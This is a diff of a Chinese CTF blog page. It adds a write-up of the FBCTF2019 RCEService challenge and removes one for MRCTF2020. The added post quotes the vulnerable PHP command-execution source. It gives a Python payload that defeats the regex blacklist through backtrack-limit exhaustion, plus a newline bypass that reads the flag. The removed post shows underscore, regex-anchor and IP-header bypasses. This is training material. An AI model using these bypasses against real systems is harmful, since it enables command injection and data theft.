@@ -71,6 +71,63 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-93" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/08/06/page-93/" class="article-date">
+  <time class="dt-published" datetime="2021-08-06T03:58:43.000Z" itemprop="datePublished">2021-08-06</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/08/06/page-93/">FBCTF2019RCEService</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>网上找到了这题的源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">putenv(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_string(<span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (preg_match(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = json_decode(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      system(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5399">https://xz.aliyun.com/t/5399</a><br>跑脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payload = &#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;zz&quot;:&quot;&#x27; + &quot;a&quot;*(1000000) + &#x27;&quot;&#125;&#x27;</span><br><span class="line"></span><br><span class="line">res = requests.post(&quot;http://1a2bd44f-f0ac-4886-8ed9-fe2b868d490d.node4.buuoj.cn/&quot;, data=&#123;&quot;cmd&quot;:payload&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
+
+<p>另一种方法</p>
+<p>因为是<strong>prematch所以匹配的第一行 就利用换行去绕过提交json格式</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&#123;%0A&quot;cmd&quot;: &quot;ls /&quot;%0A&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/140.PNG?raw=true" alt="140.PNG"></p>
+<p>**putenv(‘PATH=/home/rceservice/jail’)**已经修改了环境变量所以试着从这个路径找一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&#123;%0A&quot;cmd&quot;: &quot;ls /home/rceservice&quot;%0A&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/141.PNG?raw=true" alt="141.PNG"></p>
+<p>果然flag在这 直接用绝对路径调用就可以调用flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&#123;%0A&quot;cmd&quot;: &quot;/bin/cat /home/rceservice/flag&quot;%0A&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/142.PNG?raw=true" alt="142.PNG"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/08/06/page-93/" data-id="cksyl7wk6002cw4w7aem2g3ok" data-title="FBCTF2019RCEService" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-92" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/08/06/page-92/" class="article-date">
@@ -606,68 +663,6 @@
 
 
   
-    <article id="post-page-83" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/07/29/page-83/" class="article-date">
-  <time class="dt-published" datetime="2021-07-29T06:23:31.000Z" itemprop="datePublished">2021-07-29</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/07/29/page-83/">MRCTF2020套娃</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">//1st</span><br><span class="line">$query = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class="line"></span><br><span class="line"> if( substr_count($query, &#x27;_&#x27;) !== 0 || substr_count($query, &#x27;%5f&#x27;) != 0 )&#123;</span><br><span class="line">    die(&#x27;Y0u are So cutE!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"> if($_GET[&#x27;b_u_p_t&#x27;] !== &#x27;23333&#x27; &amp;&amp; preg_match(&#x27;/^23333$/&#x27;, $_GET[&#x27;b_u_p_t&#x27;]))&#123;</span><br><span class="line">    echo &quot;you are going to the next ~&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>右键查看源码有这么一段<br><strong>substr_count()</strong> 函数极限字串在字符串中出现的次数 有区分大小写<br><strong>%20代替下划线或者%5F 从而绕过第一个if</strong><br>从<strong>get型中取得参数b_u_p_t 不等于23333但是正则匹配需要23333可以使用%0a</strong>(正则匹配</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">中&#x27;^&#x27; 和 &#x27;$&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>代表航道开头和结尾可以利用换行绕过）绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload： b%20u%20p%20t=23333%a 或者b%5Fu%5Fp%5Ft=23333%a</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/97.PNG?raw=true" alt="97.PNG"></p>
-<p>提示这个访问一下右键查看源码<br>一<strong>长串注释是jsfuck的丢控制台</strong></p>
-<p> <img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/99.PNG?raw=true" alt="99.PNG"><br>传入<strong>参数后跳转</strong></p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/98.PNG?raw=true" alt="98.PNG"></p>
-<p>需要ip地址为127.0.0.1 抓包那边填一下client-ip:127.0.0.1</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/100.PNG?raw=true" alt="100.PNG"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents 可用php伪协议</span><br><span class="line">2333=php://input</span><br><span class="line">post: todat is a happy day</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">change函数的作用，传入的参数先进行base64解码，然后将字符转化成ASCII并且+$i*2</span><br></pre></td></tr></table></figure>
-
-<p>反写change函数 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function unchange($v)&#123; </span><br><span class="line">    $re = &#x27;&#x27;;</span><br><span class="line">    for($i=0;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) - $i*2 ); </span><br><span class="line">    &#125; </span><br><span class="line">    return $re; </span><br><span class="line">&#125;</span><br><span class="line">$real_flag = unchange(&#x27;flag.php&#x27;);</span><br><span class="line">echo base64_encode($real_flag);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>得到这串ZmpdYSZmXGI=</p>
-<p>抓包改包ok</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/101.PNG?raw=true" alt="101.PNG"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/07/29/page-83/" data-id="cksyl7wk10020w4w7femvd4n6" data-title="MRCTF2020套娃" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -704,6 +699,10 @@
       <ul>
         
           <li>
+            <a href="/2021/09/19/page-116/">第五空间WEBFTP pklovecloud</a>
+          </li>
+        
+          <li>
             <a href="/2021/09/09/page-115/">又是misc</a>
           </li>
         
@@ -717,10 +716,6 @@
         
           <li>
             <a href="/2021/08/13/page-109/">网鼎杯 2020 白虎组PicDown</a>
-          </li>
-        
-          <li>
-            <a href="/2021/08/13/page-108/">b01lers2020Welcome to Earth</a>
           </li>
         
       </ul>
